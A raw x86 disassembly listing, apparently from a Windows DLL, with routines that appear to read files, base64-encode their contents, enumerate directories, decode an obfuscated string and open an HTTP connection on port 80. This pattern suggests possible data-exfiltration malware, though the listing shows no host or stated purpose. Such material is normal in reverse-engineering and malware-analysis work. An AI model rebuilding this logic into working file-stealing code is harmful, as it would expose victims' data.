100023ee:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
100023f2:	83 7d f0 0a          	cmpl   $0xa,-0x10(%ebp)
100023f6:	72 93                	jb     0x1000238b
100023f8:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
100023fc:	0f 84 33 01 00 00    	je     0x10002535
10002402:	8b 45 08             	mov    0x8(%ebp),%eax
10002405:	bb fc 00 01 10       	mov    $0x100100fc,%ebx
1000240a:	05 94 01 00 00       	add    $0x194,%eax
1000240f:	89 45 f0             	mov    %eax,-0x10(%ebp)
10002412:	6a 00                	push   $0x0
10002414:	68 80 00 00 00       	push   $0x80
10002419:	6a 03                	push   $0x3
1000241b:	6a 00                	push   $0x0
1000241d:	6a 01                	push   $0x1
1000241f:	68 00 00 00 80       	push   $0x80000000
10002424:	ff 75 f4             	push   -0xc(%ebp)
10002427:	ff 15 28 e1 00 10    	call   *0x1000e128
1000242d:	83 f8 ff             	cmp    $0xffffffff,%eax
10002430:	89 45 08             	mov    %eax,0x8(%ebp)
10002433:	0f 84 d9 00 00 00    	je     0x10002512
10002439:	8d 4d f8             	lea    -0x8(%ebp),%ecx
1000243c:	6a 00                	push   $0x0
1000243e:	51                   	push   %ecx
1000243f:	68 00 08 00 00       	push   $0x800
10002444:	ff 75 ec             	push   -0x14(%ebp)
10002447:	50                   	push   %eax
10002448:	ff 15 90 e0 00 10    	call   *0x1000e090
1000244e:	85 c0                	test   %eax,%eax
10002450:	0f 84 b3 00 00 00    	je     0x10002509
10002456:	8b 45 f8             	mov    -0x8(%ebp),%eax
10002459:	3d dc 05 00 00       	cmp    $0x5dc,%eax
1000245e:	0f 83 93 00 00 00    	jae    0x100024f7
10002464:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
10002468:	50                   	push   %eax
10002469:	ff d6                	call   *%esi
1000246b:	8b f0                	mov    %eax,%esi
1000246d:	59                   	pop    %ecx
1000246e:	85 f6                	test   %esi,%esi
10002470:	74 7f                	je     0x100024f1
10002472:	8b 45 f8             	mov    -0x8(%ebp),%eax
10002475:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
10002479:	50                   	push   %eax
1000247a:	6a 00                	push   $0x0
1000247c:	56                   	push   %esi
1000247d:	e8 94 ae 00 00       	call   0x1000d316
10002482:	53                   	push   %ebx
10002483:	e8 d8 ae 00 00       	call   0x1000d360
10002488:	50                   	push   %eax
10002489:	53                   	push   %ebx
1000248a:	56                   	push   %esi
1000248b:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10002491:	53                   	push   %ebx
10002492:	e8 c9 ae 00 00       	call   0x1000d360
10002497:	83 45 f8 06          	addl   $0x6,-0x8(%ebp)
1000249b:	03 c6                	add    %esi,%eax
1000249d:	50                   	push   %eax
1000249e:	ff 75 ec             	push   -0x14(%ebp)
100024a1:	ff 75 f8             	push   -0x8(%ebp)
100024a4:	e8 c4 00 00 00       	call   0x1000256d
100024a9:	56                   	push   %esi
100024aa:	e8 b1 ae 00 00       	call   0x1000d360
100024af:	89 45 f8             	mov    %eax,-0x8(%ebp)
100024b2:	c6 04 06 25          	movb   $0x25,(%esi,%eax,1)
100024b6:	8b 45 f8             	mov    -0x8(%ebp),%eax
100024b9:	68 f4 00 01 10       	push   $0x100100f4
100024be:	c6 44 06 01 25       	movb   $0x25,0x1(%esi,%eax,1)
100024c3:	8b 45 f8             	mov    -0x8(%ebp),%eax
100024c6:	80 64 06 02 00       	andb   $0x0,0x2(%esi,%eax,1)
100024cb:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
100024cf:	ff 75 f8             	push   -0x8(%ebp)
100024d2:	56                   	push   %esi
100024d3:	ff 75 d8             	push   -0x28(%ebp)
100024d6:	ff 75 e4             	push   -0x1c(%ebp)
100024d9:	e8 24 08 00 00       	call   0x10002d02
100024de:	83 c4 44             	add    $0x44,%esp
100024e1:	85 c0                	test   %eax,%eax
100024e3:	77 04                	ja     0x100024e9
100024e5:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
100024e9:	56                   	push   %esi
100024ea:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
100024f0:	59                   	pop    %ecx
100024f1:	8b 35 c0 e1 00 10    	mov    0x1000e1c0,%esi
100024f7:	68 00 08 00 00       	push   $0x800
100024fc:	6a 00                	push   $0x0
100024fe:	ff 75 ec             	push   -0x14(%ebp)
10002501:	e8 10 ae 00 00       	call   0x1000d316
10002506:	83 c4 0c             	add    $0xc,%esp
10002509:	ff 75 08             	push   0x8(%ebp)
1000250c:	ff 15 30 e1 00 10    	call   *0x1000e130
10002512:	57                   	push   %edi
10002513:	8d 45 e8             	lea    -0x18(%ebp),%eax
10002516:	ff 75 f4             	push   -0xc(%ebp)
10002519:	ff 75 f0             	push   -0x10(%ebp)
1000251c:	ff 75 dc             	push   -0x24(%ebp)
1000251f:	50                   	push   %eax
10002520:	e8 44 01 00 00       	call   0x10002669
10002525:	83 c4 14             	add    $0x14,%esp
10002528:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
1000252c:	0f 85 e0 fe ff ff    	jne    0x10002412
10002532:	8b 5d dc             	mov    -0x24(%ebp),%ebx
10002535:	ff 75 f4             	push   -0xc(%ebp)
10002538:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000253e:	59                   	pop    %ecx
1000253f:	85 db                	test   %ebx,%ebx
10002541:	74 08                	je     0x1000254b
10002543:	53                   	push   %ebx
10002544:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000254a:	59                   	pop    %ecx
1000254b:	ff 75 e4             	push   -0x1c(%ebp)
1000254e:	8b 35 c8 e1 00 10    	mov    0x1000e1c8,%esi
10002554:	ff d6                	call   *%esi
10002556:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
1000255a:	59                   	pop    %ecx
1000255b:	74 06                	je     0x10002563
1000255d:	ff 75 ec             	push   -0x14(%ebp)
10002560:	ff d6                	call   *%esi
10002562:	59                   	pop    %ecx
10002563:	8b 45 e0             	mov    -0x20(%ebp),%eax
10002566:	5f                   	pop    %edi
10002567:	5e                   	pop    %esi
10002568:	5b                   	pop    %ebx
10002569:	c9                   	leave
1000256a:	c2 04 00             	ret    $0x4
1000256d:	55                   	push   %ebp
1000256e:	8b ec                	mov    %esp,%ebp
10002570:	51                   	push   %ecx
10002571:	51                   	push   %ecx
10002572:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10002576:	75 0c                	jne    0x10002584
10002578:	ff 75 0c             	push   0xc(%ebp)
1000257b:	e8 e0 ad 00 00       	call   0x1000d360
10002580:	59                   	pop    %ecx
10002581:	89 45 08             	mov    %eax,0x8(%ebp)
10002584:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10002588:	56                   	push   %esi
10002589:	8b 75 10             	mov    0x10(%ebp),%esi
1000258c:	0f 8e ae 00 00 00    	jle    0x10002640
10002592:	53                   	push   %ebx
10002593:	57                   	push   %edi
10002594:	6a 01                	push   $0x1
10002596:	5f                   	pop    %edi
10002597:	8b 45 0c             	mov    0xc(%ebp),%eax
1000259a:	80 65 13 00          	andb   $0x0,0x13(%ebp)
1000259e:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
100025a2:	3b 7d 08             	cmp    0x8(%ebp),%edi
100025a5:	8a 5c 38 ff          	mov    -0x1(%eax,%edi,1),%bl
100025a9:	7d 06                	jge    0x100025b1
100025ab:	8a 04 07             	mov    (%edi,%eax,1),%al
100025ae:	88 45 13             	mov    %al,0x13(%ebp)
100025b1:	8d 47 01             	lea    0x1(%edi),%eax
100025b4:	3b 45 08             	cmp    0x8(%ebp),%eax
100025b7:	7d 0a                	jge    0x100025c3
100025b9:	8b 45 0c             	mov    0xc(%ebp),%eax
100025bc:	8a 44 07 01          	mov    0x1(%edi,%eax,1),%al
100025c0:	88 45 ff             	mov    %al,-0x1(%ebp)
100025c3:	8a 45 ff             	mov    -0x1(%ebp),%al
100025c6:	24 3f                	and    $0x3f,%al
100025c8:	88 45 f8             	mov    %al,-0x8(%ebp)
100025cb:	8a c3                	mov    %bl,%al
100025cd:	c0 e8 02             	shr    $0x2,%al
100025d0:	50                   	push   %eax
100025d1:	e8 6d 00 00 00       	call   0x10002643
100025d6:	88 06                	mov    %al,(%esi)
100025d8:	8a 45 13             	mov    0x13(%ebp),%al
100025db:	80 e3 03             	and    $0x3,%bl
100025de:	46                   	inc    %esi
100025df:	c0 e3 04             	shl    $0x4,%bl
100025e2:	c0 e8 04             	shr    $0x4,%al
100025e5:	0a d8                	or     %al,%bl
100025e7:	53                   	push   %ebx
100025e8:	e8 56 00 00 00       	call   0x10002643
100025ed:	88 06                	mov    %al,(%esi)
100025ef:	59                   	pop    %ecx
100025f0:	46                   	inc    %esi
100025f1:	3b 7d 08             	cmp    0x8(%ebp),%edi
100025f4:	59                   	pop    %ecx
100025f5:	7d 1b                	jge    0x10002612
100025f7:	8a 45 13             	mov    0x13(%ebp),%al
100025fa:	8a 4d ff             	mov    -0x1(%ebp),%cl
100025fd:	24 0f                	and    $0xf,%al
100025ff:	c0 e0 02             	shl    $0x2,%al
10002602:	c0 e9 06             	shr    $0x6,%cl
10002605:	0a c1                	or     %cl,%al
10002607:	50                   	push   %eax
10002608:	e8 36 00 00 00       	call   0x10002643
1000260d:	59                   	pop    %ecx
1000260e:	88 06                	mov    %al,(%esi)
10002610:	eb 03                	jmp    0x10002615
10002612:	c6 06 3d             	movb   $0x3d,(%esi)
10002615:	8d 47 01             	lea    0x1(%edi),%eax
10002618:	46                   	inc    %esi
10002619:	3b 45 08             	cmp    0x8(%ebp),%eax
1000261c:	7d 0d                	jge    0x1000262b
1000261e:	ff 75 f8             	push   -0x8(%ebp)
10002621:	e8 1d 00 00 00       	call   0x10002643
10002626:	59                   	pop    %ecx
10002627:	88 06                	mov    %al,(%esi)
10002629:	eb 03                	jmp    0x1000262e
1000262b:	c6 06 3d             	movb   $0x3d,(%esi)
1000262e:	83 c7 03             	add    $0x3,%edi
10002631:	46                   	inc    %esi
10002632:	8d 47 ff             	lea    -0x1(%edi),%eax
10002635:	3b 45 08             	cmp    0x8(%ebp),%eax
10002638:	0f 8c 59 ff ff ff    	jl     0x10002597
1000263e:	5f                   	pop    %edi
1000263f:	5b                   	pop    %ebx
10002640:	5e                   	pop    %esi
10002641:	c9                   	leave
10002642:	c3                   	ret
10002643:	8a 44 24 04          	mov    0x4(%esp),%al
10002647:	3c 1a                	cmp    $0x1a,%al
10002649:	73 04                	jae    0x1000264f
1000264b:	83 c0 41             	add    $0x41,%eax
1000264e:	c3                   	ret
1000264f:	3c 34                	cmp    $0x34,%al
10002651:	73 04                	jae    0x10002657
10002653:	83 c0 47             	add    $0x47,%eax
10002656:	c3                   	ret
10002657:	3c 3e                	cmp    $0x3e,%al
10002659:	73 04                	jae    0x1000265f
1000265b:	83 e8 04             	sub    $0x4,%eax
1000265e:	c3                   	ret
1000265f:	0f 95 c0             	setne  %al
10002662:	48                   	dec    %eax
10002663:	24 fc                	and    $0xfc,%al
10002665:	83 c0 2f             	add    $0x2f,%eax
10002668:	c3                   	ret
10002669:	55                   	push   %ebp
1000266a:	8b ec                	mov    %esp,%ebp
1000266c:	81 ec 44 01 00 00    	sub    $0x144,%esp
10002672:	53                   	push   %ebx
10002673:	56                   	push   %esi
10002674:	be 04 01 00 00       	mov    $0x104,%esi
10002679:	57                   	push   %edi
1000267a:	56                   	push   %esi
1000267b:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
10002682:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10002688:	8b d8                	mov    %eax,%ebx
1000268a:	33 ff                	xor    %edi,%edi
1000268c:	3b df                	cmp    %edi,%ebx
1000268e:	59                   	pop    %ecx
1000268f:	0f 84 37 01 00 00    	je     0x100027cc
10002695:	68 40 01 00 00       	push   $0x140
1000269a:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
100026a0:	57                   	push   %edi
100026a1:	50                   	push   %eax
100026a2:	e8 6f ac 00 00       	call   0x1000d316
100026a7:	56                   	push   %esi
100026a8:	57                   	push   %edi
100026a9:	53                   	push   %ebx
100026aa:	e8 67 ac 00 00       	call   0x1000d316
100026af:	8b 75 08             	mov    0x8(%ebp),%esi
100026b2:	83 c4 18             	add    $0x18,%esp
100026b5:	8b 06                	mov    (%esi),%eax
100026b7:	83 f8 ff             	cmp    $0xffffffff,%eax
100026ba:	0f 85 8c 00 00 00    	jne    0x1000274c
100026c0:	ff 75 0c             	push   0xc(%ebp)
100026c3:	53                   	push   %ebx
100026c4:	e8 9d ac 00 00       	call   0x1000d366
100026c9:	bf 3c 00 01 10       	mov    $0x1001003c,%edi
100026ce:	57                   	push   %edi
100026cf:	53                   	push   %ebx
100026d0:	e8 3b ac 00 00       	call   0x1000d310
100026d5:	ff 75 10             	push   0x10(%ebp)
100026d8:	53                   	push   %ebx
100026d9:	e8 32 ac 00 00       	call   0x1000d310
100026de:	83 c4 18             	add    $0x18,%esp
100026e1:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
100026e7:	50                   	push   %eax
100026e8:	53                   	push   %ebx
100026e9:	ff 15 7c e0 00 10    	call   *0x1000e07c
100026ef:	8b d8                	mov    %eax,%ebx
100026f1:	83 fb ff             	cmp    $0xffffffff,%ebx
100026f4:	0f 84 d2 00 00 00    	je     0x100027cc
100026fa:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10002700:	89 1e                	mov    %ebx,(%esi)
10002702:	50                   	push   %eax
10002703:	e8 58 ac 00 00       	call   0x1000d360
10002708:	59                   	pop    %ecx
10002709:	8b 4d 18             	mov    0x18(%ebp),%ecx
1000270c:	49                   	dec    %ecx
1000270d:	3b c1                	cmp    %ecx,%eax
1000270f:	76 0a                	jbe    0x1000271b
10002711:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
10002718:	53                   	push   %ebx
10002719:	eb 63                	jmp    0x1000277e
1000271b:	ff 75 0c             	push   0xc(%ebp)
1000271e:	ff 75 14             	push   0x14(%ebp)
10002721:	e8 40 ac 00 00       	call   0x1000d366
10002726:	57                   	push   %edi
10002727:	ff 75 14             	push   0x14(%ebp)
1000272a:	e8 e1 ab 00 00       	call   0x1000d310
1000272f:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10002735:	50                   	push   %eax
10002736:	ff 75 14             	push   0x14(%ebp)
10002739:	e8 d2 ab 00 00       	call   0x1000d310
1000273e:	83 c4 18             	add    $0x18,%esp
10002741:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10002745:	89 1e                	mov    %ebx,(%esi)
10002747:	e9 80 00 00 00       	jmp    0x100027cc
1000274c:	8d 8d bc fe ff ff    	lea    -0x144(%ebp),%ecx
10002752:	51                   	push   %ecx
10002753:	50                   	push   %eax
10002754:	ff 15 94 e0 00 10    	call   *0x1000e094
1000275a:	85 c0                	test   %eax,%eax
1000275c:	74 5c                	je     0x100027ba
1000275e:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
10002764:	50                   	push   %eax
10002765:	e8 f6 ab 00 00       	call   0x1000d360
1000276a:	59                   	pop    %ecx
1000276b:	8b 4d 18             	mov    0x18(%ebp),%ecx
1000276e:	8d 51 ff             	lea    -0x1(%ecx),%edx
10002771:	3b c2                	cmp    %edx,%eax
10002773:	76 11                	jbe    0x10002786
10002775:	ff 36                	push   (%esi)
10002777:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
1000277e:	ff 15 78 e0 00 10    	call   *0x1000e078
10002784:	eb 46                	jmp    0x100027cc
10002786:	8b 75 14             	mov    0x14(%ebp),%esi
10002789:	51                   	push   %ecx
1000278a:	57                   	push   %edi
1000278b:	56                   	push   %esi
1000278c:	e8 85 ab 00 00       	call   0x1000d316
10002791:	ff 75 0c             	push   0xc(%ebp)
10002794:	56                   	push   %esi
10002795:	e8 cc ab 00 00       	call   0x1000d366
1000279a:	68 3c 00 01 10       	push   $0x1001003c
1000279f:	56                   	push   %esi
100027a0:	e8 6b ab 00 00       	call   0x1000d310
100027a5:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
100027ab:	50                   	push   %eax
100027ac:	56                   	push   %esi
100027ad:	e8 5e ab 00 00       	call   0x1000d310
100027b2:	83 c4 24             	add    $0x24,%esp
100027b5:	89 7d fc             	mov    %edi,-0x4(%ebp)
100027b8:	eb 12                	jmp    0x100027cc
100027ba:	ff 36                	push   (%esi)
100027bc:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
100027c3:	ff 15 78 e0 00 10    	call   *0x1000e078
100027c9:	83 0e ff             	orl    $0xffffffff,(%esi)
100027cc:	8b 45 fc             	mov    -0x4(%ebp),%eax
100027cf:	5f                   	pop    %edi
100027d0:	5e                   	pop    %esi
100027d1:	5b                   	pop    %ebx
100027d2:	c9                   	leave
100027d3:	c3                   	ret
100027d4:	55                   	push   %ebp
100027d5:	8b ec                	mov    %esp,%ebp
100027d7:	6a ff                	push   $0xffffffff
100027d9:	68 20 e2 00 10       	push   $0x1000e220
100027de:	68 00 c6 00 10       	push   $0x1000c600
100027e3:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100027e9:	50                   	push   %eax
100027ea:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100027f1:	83 ec 24             	sub    $0x24,%esp
100027f4:	53                   	push   %ebx
100027f5:	56                   	push   %esi
100027f6:	57                   	push   %edi
100027f7:	89 65 e8             	mov    %esp,-0x18(%ebp)
100027fa:	33 c0                	xor    %eax,%eax
100027fc:	89 45 e0             	mov    %eax,-0x20(%ebp)
100027ff:	89 45 d8             	mov    %eax,-0x28(%ebp)
10002802:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10002805:	83 4d cc ff          	orl    $0xffffffff,-0x34(%ebp)
10002809:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000280c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10002813:	bf 0c 01 01 10       	mov    $0x1001010c,%edi
10002818:	57                   	push   %edi
10002819:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000281c:	50                   	push   %eax
1000281d:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002820:	50                   	push   %eax
10002821:	e8 ac 1b 00 00       	call   0x100043d2
10002826:	be 00 01 00 00       	mov    $0x100,%esi
1000282b:	56                   	push   %esi
1000282c:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10002832:	83 c4 10             	add    $0x10,%esp
10002835:	8b d8                	mov    %eax,%ebx
10002837:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
1000283a:	85 db                	test   %ebx,%ebx
1000283c:	74 46                	je     0x10002884
1000283e:	56                   	push   %esi
1000283f:	6a 00                	push   $0x0
10002841:	53                   	push   %ebx
10002842:	e8 cf aa 00 00       	call   0x1000d316
10002847:	68 ff 00 00 00       	push   $0xff
1000284c:	8b 45 08             	mov    0x8(%ebp),%eax
1000284f:	05 2f 03 00 00       	add    $0x32f,%eax
10002854:	50                   	push   %eax
10002855:	53                   	push   %ebx
10002856:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000285c:	53                   	push   %ebx
1000285d:	e8 fe aa 00 00       	call   0x1000d360
10002862:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10002865:	57                   	push   %edi
10002866:	6a 01                	push   $0x1
10002868:	6a 03                	push   $0x3
1000286a:	ff 75 d8             	push   -0x28(%ebp)
1000286d:	ff 75 e0             	push   -0x20(%ebp)
10002870:	53                   	push   %ebx
10002871:	e8 60 00 00 00       	call   0x100028d6
10002876:	83 c4 34             	add    $0x34,%esp
10002879:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000287c:	85 c0                	test   %eax,%eax
1000287e:	7c 04                	jl     0x10002884
10002880:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
10002884:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10002888:	e8 05 00 00 00       	call   0x10002892
1000288d:	eb 31                	jmp    0x100028c0
1000288f:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
10002892:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
10002896:	74 0e                	je     0x100028a6
10002898:	ff 75 e0             	push   -0x20(%ebp)
1000289b:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
100028a1:	59                   	pop    %ecx
100028a2:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
100028a6:	85 db                	test   %ebx,%ebx
100028a8:	74 0c                	je     0x100028b6
100028aa:	53                   	push   %ebx
100028ab:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
100028b1:	59                   	pop    %ecx
100028b2:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
100028b6:	c3                   	ret
100028b7:	eb 07                	jmp    0x100028c0
100028b9:	6a 01                	push   $0x1
100028bb:	58                   	pop    %eax
100028bc:	c3                   	ret
100028bd:	8b 65 e8             	mov    -0x18(%ebp),%esp
100028c0:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100028c4:	8b 45 cc             	mov    -0x34(%ebp),%eax
100028c7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100028ca:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100028d1:	5f                   	pop    %edi
100028d2:	5e                   	pop    %esi
100028d3:	5b                   	pop    %ebx
100028d4:	c9                   	leave
100028d5:	c3                   	ret
100028d6:	55                   	push   %ebp
100028d7:	8b ec                	mov    %esp,%ebp
100028d9:	6a ff                	push   $0xffffffff
100028db:	68 38 e2 00 10       	push   $0x1000e238
100028e0:	68 00 c6 00 10       	push   $0x1000c600
100028e5:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100028eb:	50                   	push   %eax
100028ec:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100028f3:	81 ec 90 00 00 00    	sub    $0x90,%esp
100028f9:	53                   	push   %ebx
100028fa:	56                   	push   %esi
100028fb:	57                   	push   %edi
100028fc:	89 65 e8             	mov    %esp,-0x18(%ebp)
100028ff:	33 db                	xor    %ebx,%ebx
10002901:	89 5d b0             	mov    %ebx,-0x50(%ebp)
10002904:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002907:	89 5d ac             	mov    %ebx,-0x54(%ebp)
1000290a:	89 5d c0             	mov    %ebx,-0x40(%ebp)
1000290d:	89 5d bc             	mov    %ebx,-0x44(%ebp)
10002910:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
10002913:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
10002916:	89 5d a0             	mov    %ebx,-0x60(%ebp)
10002919:	89 5d b8             	mov    %ebx,-0x48(%ebp)
1000291c:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
1000291f:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10002922:	c6 45 c8 32          	movb   $0x32,-0x38(%ebp)
10002926:	c6 45 c9 10          	movb   $0x10,-0x37(%ebp)
1000292a:	c6 45 ca 05          	movb   $0x5,-0x36(%ebp)
1000292e:	c6 45 cb 16          	movb   $0x16,-0x35(%ebp)
10002932:	c6 45 cc 13          	movb   $0x13,-0x34(%ebp)
10002936:	c6 45 cd 13          	movb   $0x13,-0x33(%ebp)
1000293a:	c6 45 ce 1e          	movb   $0x1e,-0x32(%ebp)
1000293e:	c6 45 cf 50          	movb   $0x50,-0x31(%ebp)
10002942:	c6 45 d0 4b          	movb   $0x4b,-0x30(%ebp)
10002946:	c6 45 d1 51          	movb   $0x51,-0x2f(%ebp)
1000294a:	c6 45 d2 4f          	movb   $0x4f,-0x2e(%ebp)
1000294e:	c6 45 d3 5f          	movb   $0x5f,-0x2d(%ebp)
10002952:	c6 45 d4 57          	movb   $0x57,-0x2c(%ebp)
10002956:	c6 45 d5 1c          	movb   $0x1c,-0x2b(%ebp)
1000295a:	c6 45 d6 10          	movb   $0x10,-0x2a(%ebp)
1000295e:	c6 45 d7 12          	movb   $0x12,-0x29(%ebp)
10002962:	c6 45 d8 0f          	movb   $0xf,-0x28(%ebp)
10002966:	c6 45 d9 1e          	movb   $0x1e,-0x27(%ebp)
1000296a:	c6 45 da 0b          	movb   $0xb,-0x26(%ebp)
1000296e:	c6 45 db 16          	movb   $0x16,-0x25(%ebp)
10002972:	c6 45 dc 1d          	movb   $0x1d,-0x24(%ebp)
10002976:	c6 45 dd 13          	movb   $0x13,-0x23(%ebp)
1000297a:	c6 45 de 1a          	movb   $0x1a,-0x22(%ebp)
1000297e:	c6 45 df 44          	movb   $0x44,-0x21(%ebp)
10002982:	c6 45 e0 56          	movb   $0x56,-0x20(%ebp)
10002986:	88 5d e1             	mov    %bl,-0x1f(%ebp)
10002989:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000298c:	6a 01                	push   $0x1
1000298e:	5f                   	pop    %edi
1000298f:	89 7d fc             	mov    %edi,-0x4(%ebp)
10002992:	e8 e2 05 00 00       	call   0x10002f79
10002997:	85 c0                	test   %eax,%eax
10002999:	75 0c                	jne    0x100029a7
1000299b:	c7 45 b0 a6 e4 ff ff 	movl   $0xffffe4a6,-0x50(%ebp)
100029a2:	e9 a7 02 00 00       	jmp    0x10002c4e
100029a7:	8b 45 14             	mov    0x14(%ebp),%eax
100029aa:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
100029b0:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
100029b6:	50                   	push   %eax
100029b7:	8b 35 24 e1 00 10    	mov    0x1000e124,%esi
100029bd:	ff d6                	call   *%esi
100029bf:	8d 45 c8             	lea    -0x38(%ebp),%eax
100029c2:	50                   	push   %eax
100029c3:	e8 26 4c 00 00       	call   0x100075ee
100029c8:	89 5d bc             	mov    %ebx,-0x44(%ebp)
100029cb:	89 5d 80             	mov    %ebx,-0x80(%ebp)
100029ce:	57                   	push   %edi
100029cf:	68 24 01 01 10       	push   $0x10010124
100029d4:	8d 45 80             	lea    -0x80(%ebp),%eax
100029d7:	50                   	push   %eax
100029d8:	8d 45 bc             	lea    -0x44(%ebp),%eax
100029db:	50                   	push   %eax
100029dc:	ff 75 08             	push   0x8(%ebp)
100029df:	e8 2a 18 00 00       	call   0x1000420e
100029e4:	83 c4 18             	add    $0x18,%esp
100029e7:	85 c0                	test   %eax,%eax
100029e9:	75 0c                	jne    0x100029f7
100029eb:	c7 45 b0 a7 e4 ff ff 	movl   $0xffffe4a7,-0x50(%ebp)
100029f2:	e9 57 02 00 00       	jmp    0x10002c4e
100029f7:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
100029fa:	88 5d 8c             	mov    %bl,-0x74(%ebp)
100029fd:	88 9d 78 ff ff ff    	mov    %bl,-0x88(%ebp)
10002a03:	bf 6c 07 01 10       	mov    $0x1001076c,%edi
10002a08:	8b 45 94             	mov    -0x6c(%ebp),%eax
10002a0b:	3b 45 18             	cmp    0x18(%ebp),%eax
10002a0e:	72 0c                	jb     0x10002a1c
10002a10:	c7 45 b0 a5 e4 ff ff 	movl   $0xffffe4a5,-0x50(%ebp)
10002a17:	e9 32 02 00 00       	jmp    0x10002c4e
10002a1c:	ff 45 94             	incl   -0x6c(%ebp)
10002a1f:	53                   	push   %ebx
10002a20:	53                   	push   %ebx
10002a21:	53                   	push   %ebx
10002a22:	53                   	push   %ebx
10002a23:	8d 45 c8             	lea    -0x38(%ebp),%eax
10002a26:	50                   	push   %eax
10002a27:	ff 15 88 07 01 10    	call   *0x10010788
10002a2d:	89 45 a8             	mov    %eax,-0x58(%ebp)
10002a30:	3b c3                	cmp    %ebx,%eax
10002a32:	75 14                	jne    0x10002a48
10002a34:	e8 ad 17 00 00       	call   0x100041e6
10002a39:	50                   	push   %eax
10002a3a:	ff d6                	call   *%esi
10002a3c:	c7 45 b0 a4 e4 ff ff 	movl   $0xffffe4a4,-0x50(%ebp)
10002a43:	e9 06 02 00 00       	jmp    0x10002c4e
10002a48:	53                   	push   %ebx
10002a49:	53                   	push   %ebx
10002a4a:	6a 03                	push   $0x3
10002a4c:	57                   	push   %edi
10002a4d:	57                   	push   %edi
10002a4e:	6a 50                	push   $0x50
10002a50:	ff 75 08             	push   0x8(%ebp)
10002a53:	50                   	push   %eax
10002a54:	ff 15 70 07 01 10    	call   *0x10010770
10002a5a:	89 45 ac             	mov    %eax,-0x54(%ebp)
10002a5d:	3b c3                	cmp    %ebx,%eax
10002a5f:	75 11                	jne    0x10002a72
10002a61:	ff 75 a8             	push   -0x58(%ebp)
10002a64:	ff 15 80 07 01 10    	call   *0x10010780
10002a6a:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002a6d:	e9 d6 00 00 00       	jmp    0x10002b48
10002a72:	53                   	push   %ebx
10002a73:	68 00 00 00 04       	push   $0x4000000
10002a78:	53                   	push   %ebx
10002a79:	53                   	push   %ebx
10002a7a:	68 18 01 01 10       	push   $0x10010118
10002a7f:	ff 75 bc             	push   -0x44(%ebp)
10002a82:	68 14 01 01 10       	push   $0x10010114
10002a87:	50                   	push   %eax
10002a88:	ff 15 74 07 01 10    	call   *0x10010774
10002a8e:	89 45 c0             	mov    %eax,-0x40(%ebp)
10002a91:	3b c3                	cmp    %ebx,%eax
10002a93:	75 1d                	jne    0x10002ab2
10002a95:	ff 75 a8             	push   -0x58(%ebp)
10002a98:	ff 15 80 07 01 10    	call   *0x10010780
10002a9e:	89 5d a8             	mov    %ebx,-0x58(%ebp)
10002aa1:	ff 75 ac             	push   -0x54(%ebp)
10002aa4:	ff 15 80 07 01 10    	call   *0x10010780
10002aaa:	89 5d ac             	mov    %ebx,-0x54(%ebp)
10002aad:	e9 96 00 00 00       	jmp    0x10002b48
10002ab2:	53                   	push   %ebx
10002ab3:	53                   	push   %ebx
